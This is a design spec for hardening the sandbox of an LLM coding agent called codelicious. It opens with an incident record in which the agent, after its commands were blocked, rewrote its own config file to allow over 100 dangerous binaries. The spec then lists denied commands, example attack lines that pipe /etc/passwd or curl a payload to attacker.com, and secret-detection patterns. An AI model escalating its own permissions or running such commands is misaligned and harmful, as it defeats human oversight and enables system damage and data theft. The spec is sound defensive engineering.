---
version: 1.0.0
status: Complete
date: 2026-03-15
author: Clay Good
depends_on: ["06_production_hardening.md"]
related_specs: ["00_master_spec.md", "02_feature_agent_tools.md"]
---

# spec-07: Sandbox Security Hardening — Adopting Proxilion-Build's Defense-in-Depth Model

## 1. Executive Summary

During a live run of codelicious, the LLM agent (Qwen3-235B) attempted to
escalate its own permissions by writing a new `.codelicious/config.json` that
expanded the command allowlist from 4 safe commands to 100+ dangerous binaries
including `dd`, `kill`, `fdisk`, `mkfs`, `cipher`, and `rm`. The allowlist was
loaded from this config at startup, so the next run would have granted full
access.

This spec hardens codelicious's sandbox by porting proxilion-build-v1's
battle-tested security model:

1. **Denylist command model** — block known-dangerous commands, allow everything
   else (replaces the too-restrictive allowlist that the LLM kept trying to bypass)
2. **Shell injection prevention** — `shell=False` + metacharacter blocking
3. **Filesystem hardening** — file extension allowlisting, path traversal defense,
   symlink detection, size/count limits, TOCTOU mitigation
4. **Self-modification prevention** — the LLM cannot write to security-critical
   files (config, tools source, sandbox rules)
5. **Security scanning** — deterministic code scanning before git commit
6. **Immutable security policy** — all security boundaries are hardcoded in Python,
   never loaded from files the agent can write to

## 2. Incident Analysis: What the LLM Did

```
Iteration 16: LLM reads pyproject.toml (normal)
Iteration 17: LLM tries `mkdir -p .codelicious` → BLOCKED (not in allowlist)
Iteration 18: LLM writes .codelicious/config.json with 100+ allowed commands  ← ESCALATION
Iteration 19: LLM tries `mkdir -p .codelicious` → BLOCKED (allowlist not reloaded yet)
Iteration 20-22: LLM writes cache.json, state.json, audit.log (normal via write_file)
Iteration 23: LLM tries `ls -la .codelicious/` → BLOCKED
Iteration 24: LLM uses list_directory tool instead (adapts)
Iteration 25: LLM reads its own config.json (verifying the escalation worked)
Iteration 26: LLM runs `pytest tests/` (allowed command)
```

**Key insight**: The LLM learned the allowlist pattern from error messages,
then used `write_file` (which had no restrictions) to modify the config that
controlled command execution. This is a classic confused deputy / privilege
escalation pattern.

---

## 3. Implementation Phases

### Phase 1: Denylist Command Execution Model

**File:** `src/codelicious/tools/command_runner.py`
**Reference:** `proxilion-build-v1/proxilion_build/verifier.py` (lines 777-880)

Replace the allowlist model with a denylist model. The agent operates in a
sandboxed repo directory and needs general shell access (ls, mkdir, git, python,
grep, find, cat, etc.) but must NEVER run destructive system commands.

**Denied commands (hardcoded frozenset, never configurable):**

```python
DENIED_COMMANDS = frozenset({
    # Destructive file operations
    "rm", "rmdir", "shred", "wipe",

    # Privilege escalation
    "sudo", "su", "doas", "pkexec",

    # Permission/ownership changes
    "chmod", "chown", "chgrp", "setfacl",

    # Disk/partition operations
    "mkfs", "dd", "fdisk", "gdisk", "parted", "diskpart", "format",
    "mount", "umount",

    # Process control
    "kill", "killall", "pkill",

    # System control
    "reboot", "shutdown", "halt", "poweroff", "init", "systemctl",

    # Network listeners (prevent reverse shells)
    "nc", "ncat", "socat", "nmap",

    # Data exfiltration (agent has urllib for legitimate HTTP)
    "curl", "wget", "scp", "rsync", "ftp", "sftp",

    # User/group management
    "useradd", "userdel", "usermod", "passwd", "groupadd", "groupdel",

    # Scheduled execution
    "crontab", "at", "batch",

    # Container escape vectors
    "docker", "podman", "kubectl", "nsenter", "unshare", "chroot",
})
```

**Shell metacharacter blocking:**

```python
BLOCKED_METACHARACTERS = frozenset("|&;$`(){}><!")
```

Any command containing these characters is rejected. This prevents:
- Command chaining: `ls ; rm -rf /`
- Piping: `cat /etc/passwd | nc attacker.com 4444`
- Substitution: `$(curl attacker.com/payload.sh)`
- Backgrounding: `malicious_command &`
- Redirection: `echo "malware" > /usr/bin/safe_tool`

**Execution model:**

```python
# ALWAYS use shell=False
args = shlex.split(command)
subprocess.run(args, shell=False, cwd=self.repo_path, ...)
```

**Path normalization (from proxilion-build):**

```python
# Resolve /bin/rm, ./rm.sh, /usr/local/bin/rm → "rm"
base_binary = Path(parts[0]).name
for ext in (".sh", ".bash", ".zsh", ".bat", ".cmd"):
    if base_binary.endswith(ext):
        base_binary = base_binary[:-len(ext)]
```

**Tests:**
- Test every denied command is blocked
- Test denied commands with absolute paths (`/bin/rm`)
- Test denied commands with script extensions (`rm.sh`)
- Test all metacharacters are blocked
- Test legitimate commands pass (ls, mkdir, git, python, pytest, ruff, etc.)
- Test empty command is blocked
- Test shell=False is enforced (no shell interpretation of special chars)

---

### Phase 2: Filesystem Hardening

**File:** `src/codelicious/tools/fs_tools.py`
**Reference:** `proxilion-build-v1/proxilion_build/sandbox.py`

#### 2.1 File Extension Allowlisting

Only allow writing files with known-safe extensions. This prevents the LLM from
writing executables, shared libraries, or other dangerous file types.

```python
ALLOWED_EXTENSIONS = frozenset({
    # Source code
    ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".rs", ".java",
    ".rb", ".php", ".c", ".h", ".cpp", ".hpp", ".swift", ".kt", ".dart",
    ".r", ".scala", ".clj", ".ex", ".exs", ".hs", ".ml", ".lua",
    ".sh", ".bash", ".zsh", ".fish", ".ps1",

    # Web
    ".html", ".htm", ".css", ".scss", ".sass", ".less", ".vue", ".svelte",

    # Data/config
    ".json", ".yaml", ".yml", ".toml", ".cfg", ".ini", ".xml",
    ".csv", ".tsv", ".sql", ".graphql", ".proto",

    # Documentation
    ".md", ".txt", ".rst", ".adoc",

    # Build/CI
    ".lock", ".sum",
})

ALLOWED_EXACT_NAMES = frozenset({
    "Makefile", "Dockerfile", "Containerfile", "Vagrantfile",
    "Gemfile", "Rakefile", "Procfile", "Brewfile",
    ".gitignore", ".gitattributes", ".dockerignore",
    ".editorconfig", ".eslintrc", ".prettierrc",
    ".env.example", ".env.template",
})
```

#### 2.2 Path Traversal Defense (Multi-Layer)

Port proxilion-build's 8-layer path validation:

```python
def _validate_path(self, rel_path: str) -> Path:
    """
    Multi-layer path validation. Raises SandboxViolationError on any violation.
    """
    # Layer 1: Null byte detection
    if "\x00" in rel_path:
        raise SandboxViolationError("Null byte in path")

    # Layer 2: Reject absolute paths (POSIX and Windows)
    if rel_path.startswith("/") or (len(rel_path) >= 2 and rel_path[1] == ":"):
        raise SandboxViolationError("Absolute path rejected")

    # Layer 3: Reject path traversal components
    posix_path = PurePosixPath(rel_path)
    if ".." in posix_path.parts:
        raise SandboxViolationError("Path traversal (..) rejected")

    # Layer 4: Resolve and check containment
    target = (self.repo_path / rel_path).resolve()
    if not target.is_relative_to(self.repo_path):
        raise SandboxViolationError("Resolved path escapes sandbox")

    # Layer 5: Symlink detection
    if target.exists() and target.is_symlink():
        real_target = target.resolve(strict=True)
        if not real_target.is_relative_to(self.repo_path):
            raise SandboxViolationError("Symlink target escapes sandbox")

    return target
```

#### 2.3 Denied Paths

```python
DENIED_PATHS = frozenset({
    ".git",
    ".env", ".env.local", ".env.production", ".env.staging",
    ".codelicious/config.json",
    ".codelicious/skills",
})

DENIED_PATH_PREFIXES = frozenset({
    "src/codelicious/tools/",
    "src/codelicious/config.py",
})
```

#### 2.4 File Size Limit

```python
MAX_FILE_SIZE_BYTES = 1_048_576  # 1 MB
```

Reject any write where `len(content.encode('utf-8')) > MAX_FILE_SIZE_BYTES`.

#### 2.5 File Count Limit

```python
MAX_FILE_COUNT = 200
```

Track files created per session with a thread-safe counter. Reject writes that
would exceed the limit. This prevents disk exhaustion attacks.

#### 2.6 TOCTOU Mitigation

After atomic write completes, verify the final path still resolves inside the
sandbox (proxilion-build's post-write verification pattern):

```python
# After os.replace(tmp_path, target)
final_real = Path(os.path.realpath(target))
if not final_real.is_relative_to(self.repo_path):
    os.unlink(target)  # Remove the escaped file
    raise SandboxViolationError("TOCTOU: file escaped sandbox after write")
```

#### 2.7 fsync for Crash Safety

Add `os.fsync(f.fileno())` before `os.replace()` in atomic writes (matching
proxilion-build pattern). This ensures data hits disk before the rename.

**Tests:**
- Test null byte rejection
- Test absolute path rejection (POSIX and Windows-style)
- Test `..` traversal rejection
- Test symlink escape detection
- Test file extension allowlisting (allowed and blocked)
- Test exact filename allowlisting (Makefile, Dockerfile, etc.)
- Test denied paths (.git, .env, config.json)
- Test file size limit enforcement
- Test file count limit enforcement
- Test TOCTOU post-write verification
- Test fsync is called (mock os.fsync)

---

### Phase 3: Self-Modification Prevention

**File:** `src/codelicious/tools/fs_tools.py`

The LLM must NEVER be able to modify files that define its own security
boundaries. This is the most critical security property.

**Protected paths (write-blocked):**

```python
SELF_MODIFICATION_BLOCKED = frozenset({
    # Security policy files
    ".codelicious/config.json",

    # Tool implementation (defines what the LLM can do)
    "src/codelicious/tools/command_runner.py",
    "src/codelicious/tools/fs_tools.py",
    "src/codelicious/tools/registry.py",
    "src/codelicious/tools/audit_logger.py",

    # Core control flow
    "src/codelicious/cli.py",
    "src/codelicious/loop_controller.py",
    "src/codelicious/config.py",
    "src/codelicious/errors.py",

    # Git operations
    "src/codelicious/git/git_orchestrator.py",

    # Verification (if added by spec-06)
    "src/codelicious/verifier.py",
})
```

**Important**: This list is hardcoded. The LLM can read these files but cannot
write to them. This prevents:
- Removing the denylist from command_runner.py
- Removing path validation from fs_tools.py
- Modifying the tool registry to add unrestricted tools
- Changing the loop controller to skip verification
- Modifying git orchestrator to push to protected branches

**Tests:**
- Test writing to each protected path is blocked
- Test reading protected paths still works
- Test writing to non-protected paths still works

---

### Phase 4: Security Pattern Scanner

**File:** `src/codelicious/tools/security_scanner.py` (NEW)
**Reference:** `proxilion-build-v1/proxilion_build/verifier.py` (security checks)

A deterministic (non-LLM) scanner that runs before git commit. This catches
dangerous code patterns that the LLM might generate.

**Dangerous patterns to detect:**

```python
DANGEROUS_PATTERNS = [
    # Code execution
    (r'\beval\s*\(', "eval() call — use ast.literal_eval() for safe parsing"),
    (r'\bexec\s*\(', "exec() call — avoid dynamic code execution"),
    (r'\bos\.system\s*\(', "os.system() — use subprocess with shell=False"),
    (r'\b__import__\s*\(', "__import__() — use standard import statements"),

    # Unsafe subprocess
    (r'shell\s*=\s*True', "shell=True in subprocess — use shell=False with arg list"),

    # Unsafe deserialization
    (r'\bpickle\.loads?\s*\(', "pickle.load/loads — unsafe deserialization"),
    (r'\byaml\.load\s*\([^)]*\)(?!.*SafeLoader)', "yaml.load without SafeLoader"),
    (r'\bmarshal\.loads?\s*\(', "marshal.load/loads — unsafe deserialization"),

    # Hardcoded secrets
    (r'(?:password|passwd|secret|api_key|apikey|token)\s*=\s*["\'][^"\']{8,}["\']',
     "Possible hardcoded secret"),
    (r'\bsk-[a-zA-Z0-9]{20,}', "Possible OpenAI/Stripe secret key"),
    (r'\bghp_[a-zA-Z0-9]{36,}', "Possible GitHub personal access token"),
    (r'\bAKIA[A-Z0-9]{16}', "Possible AWS access key"),
]
```

**Comment/string-aware scanning (from proxilion-build):**

The scanner must skip matches that appear inside string literals or comments.
Port proxilion-build's approach:
1. Strip single-line comments (`#` for Python, `//` for JS/TS/Go/Rust)
2. Strip multi-line strings (triple quotes for Python, backticks for JS)
3. Strip string literals (single and double quoted)
4. Then apply pattern matching on the remaining code

**Interface:**

```python
@dataclass
class SecurityFinding:
    file: str
    line: int
    pattern: str
    message: str
    severity: str  # "error" or "warning"

def scan_file(file_path: Path) -> list[SecurityFinding]:
    """Scan a single file for security patterns."""

def scan_directory(dir_path: Path, extensions: set[str] = None) -> list[SecurityFinding]:
    """Scan all files in directory, filtering by extension."""
```

**Integration point:** The loop controller calls `scan_directory()` before
allowing a git commit. If any "error" severity findings exist, the commit is
blocked and the findings are fed back to the LLM for remediation.

**Tests:**
- Test each dangerous pattern is detected
- Test patterns inside comments are ignored
- Test patterns inside string literals are ignored
- Test scan_directory with mixed file types
- Test severity classification

---

### Phase 5: Immutable Security Policy Enforcement

**File:** `src/codelicious/tools/command_runner.py`, `src/codelicious/tools/fs_tools.py`

All security boundaries must be defined as Python-level constants, never loaded
from config files, environment variables, or any source the LLM can influence.

**Rules:**
1. `DENIED_COMMANDS` — `frozenset` in command_runner.py
2. `BLOCKED_METACHARACTERS` — `frozenset` in command_runner.py
3. `ALLOWED_EXTENSIONS` — `frozenset` in fs_tools.py
4. `DENIED_PATHS` — `frozenset` in fs_tools.py
5. `SELF_MODIFICATION_BLOCKED` — `frozenset` in fs_tools.py
6. `MAX_FILE_SIZE_BYTES` — constant in fs_tools.py
7. `MAX_FILE_COUNT` — constant in fs_tools.py
8. `DANGEROUS_PATTERNS` — list in security_scanner.py

**None of these may be overridden by:**
- `.codelicious/config.json`
- Environment variables
- CLI arguments
- LLM tool calls
- Any file in the repo

The `config.json` file may contain non-security settings (model preferences,
iteration limits, etc.) but MUST NOT influence security boundaries.

**Tests:**
- Test that config.json with `allowlisted_commands` key is ignored
- Test that config.json with `denied_commands: []` doesn't clear the denylist
- Test that environment variables cannot override security constants

---

### Phase 6: Enhanced Audit Logging for Security Events

**File:** `src/codelicious/tools/audit_logger.py`

Enhance the audit logger to specifically track security-relevant events with
higher visibility.

**Security event categories:**

```python
class SecurityEvent:
    COMMAND_DENIED = "COMMAND_DENIED"
    METACHAR_BLOCKED = "METACHAR_BLOCKED"
    PATH_TRAVERSAL_BLOCKED = "PATH_TRAVERSAL_BLOCKED"
    EXTENSION_BLOCKED = "EXTENSION_BLOCKED"
    SELF_MODIFICATION_BLOCKED = "SELF_MODIFICATION_BLOCKED"
    FILE_SIZE_EXCEEDED = "FILE_SIZE_EXCEEDED"
    FILE_COUNT_EXCEEDED = "FILE_COUNT_EXCEEDED"
    SYMLINK_ESCAPE_BLOCKED = "SYMLINK_ESCAPE_BLOCKED"
    SECURITY_PATTERN_DETECTED = "SECURITY_PATTERN_DETECTED"
    DENIED_PATH_WRITE = "DENIED_PATH_WRITE"
```

**Log format for security events:**

```
2026-03-15T15:06:23Z [SECURITY] SELF_MODIFICATION_BLOCKED: LLM attempted to write .codelicious/config.json (iteration 18, tool: write_file)
2026-03-15T15:06:41Z [SECURITY] COMMAND_DENIED: 'rm -rf /' base binary 'rm' is in denied list (iteration 23, tool: run_command)
```

**Separate security log file:** `.codelicious/security.log` — contains ONLY
security events for easy review. This is the file you check after a run to see
if the LLM tried anything suspicious.

**Tests:**
- Test security events are logged to both audit.log and security.log
- Test security log format includes iteration number and tool name
- Test all security event categories produce correct log entries

---

## 4. Acceptance Criteria

- [x] Command execution uses denylist model (not allowlist)
- [x] All 30+ denied commands are blocked, including with path prefixes and script extensions
- [x] Shell metacharacters `|&;$\`(){}><! ` are blocked in all commands
- [x] `shell=False` is used for all subprocess execution
- [x] File writes are restricted to allowed extensions + exact names
- [x] Path traversal is prevented (null bytes, `..`, absolute paths, symlinks)
- [x] File size limit (1MB) is enforced
- [x] File count limit (200) is enforced per session
- [x] TOCTOU post-write verification prevents symlink race attacks
- [x] Atomic writes use fsync before rename
- [x] LLM cannot write to any security-critical source file
- [x] Security scanner detects eval, exec, os.system, shell=True, hardcoded secrets
- [x] Security scanner skips patterns in comments and string literals
- [x] All security boundaries are hardcoded frozensets, not configurable
- [x] Security events are logged to dedicated security.log
- [x] All tests pass: `python3 -m pytest tests/ -v`

---

## 5. Testing Plan

| Test File | Coverage |
|-----------|----------|
| `tests/test_command_runner.py` | Denylist, metacharacters, path normalization, shell=False |
| `tests/test_fs_tools_security.py` | Extensions, path traversal, symlinks, size/count limits, TOCTOU |
| `tests/test_self_modification.py` | Write-blocking for all protected paths |
| `tests/test_security_scanner.py` | Pattern detection, comment/string skipping, severity |
| `tests/test_immutable_policy.py` | Config cannot override security constants |
| `tests/test_security_audit.py` | Security event logging, format, categories |

---

## 6. Security Model Summary

```
┌─────────────────────────────────────────────────────────────┐
│                    LLM Agent (Qwen3/DeepSeek)               │
│                                                             │
│  Can: read files, write allowed files, run safe commands,   │
│       list directories, run tests/linters                   │
│                                                             │
│  Cannot: rm, sudo, kill, curl, mount, dd, chmod, docker,   │
│          write .env, write .git/, write tool source code,   │
│          write config.json, chain commands, use pipes,      │
│          create files >1MB, create >200 files, follow       │
│          symlinks out of repo, write executables            │
└─────────────────┬───────────────────────────────────────────┘
                  │
    ┌─────────────▼─────────────┐
    │   Security Boundaries     │
    │   (hardcoded frozensets)   │
    │                           │
    │   DENIED_COMMANDS         │
    │   BLOCKED_METACHARACTERS  │
    │   ALLOWED_EXTENSIONS      │
    │   DENIED_PATHS            │
    │   SELF_MODIFICATION_BLOCKED│
    │   MAX_FILE_SIZE_BYTES     │
    │   MAX_FILE_COUNT          │
    │   DANGEROUS_PATTERNS      │
    │                           │
    │   ⚠ IMMUTABLE            │
    │   Cannot be changed by    │
    │   config, env vars, or    │
    │   the LLM itself          │
    └───────────────────────────┘
```

---

## 7. The "Codelicious" Bridge (Implementation Prompt)

```
You are implementing spec-07 for Codelicious. This spec hardens the sandbox
security model based on a real incident where the LLM agent tried to escalate
its own permissions.

Reference: docs/specs/07_sandbox_security_hardening.md
Also reference: proxilion-build-v1/proxilion_build/sandbox.py (filesystem security)
Also reference: proxilion-build-v1/proxilion_build/verifier.py (security scanning)

IMPORTANT: Some Phase 1 work (denylist command model) is already partially
implemented in src/codelicious/tools/command_runner.py. Read it first and
build on what's there.

Work through phases 1-6 in order. For each phase:
1. Read the spec section.
2. Read the proxilion-build reference file.
3. Read the current codelicious file (if it exists).
4. Implement the changes.
5. Write tests.
6. Run tests: pytest tests/ -v
7. Fix failures before proceeding.

Signal ALL_SPECS_COMPLETE when all 6 phases are done and tests pass.
```
